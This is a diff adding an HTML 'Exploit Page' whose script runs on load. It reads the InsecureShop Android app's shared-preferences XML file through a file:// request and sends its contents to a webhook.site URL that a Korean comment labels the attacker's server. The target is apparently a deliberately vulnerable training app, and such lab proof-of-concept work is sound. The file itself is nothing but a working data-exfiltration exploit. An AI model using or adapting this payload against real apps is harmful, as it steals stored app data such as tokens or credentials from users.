@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Page</title>
+</head>
+<body>
+<script type="text/javascript">
+    function readLocalFile() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml", true);
+        xhr.onload = function () {
+            sendToServer(xhr.responseText);
+            document.body.innerHTML = "Data sent to attacker";
+        };
+        xhr.onerror = function () {
+            document.body.innerHTML = "Failed to read local file";
+        };
+        xhr.send();
+    }
+
+    function sendToServer(data) {
+        var xhr = new XMLHttpRequest();
+        // 공격자 서버 URL로 데이터 전송 (적절히 URL 인코딩 필요)
+        var url = "https://webhook.site/f0d57e8f-5a2b-47d2-ac55-e50a12b2cebb?data=" + encodeURIComponent(data);
+        xhr.open("GET", url, true);
+        xhr.send();
+    }
+
+    readLocalFile();
+</script>
+</body>
+</html>
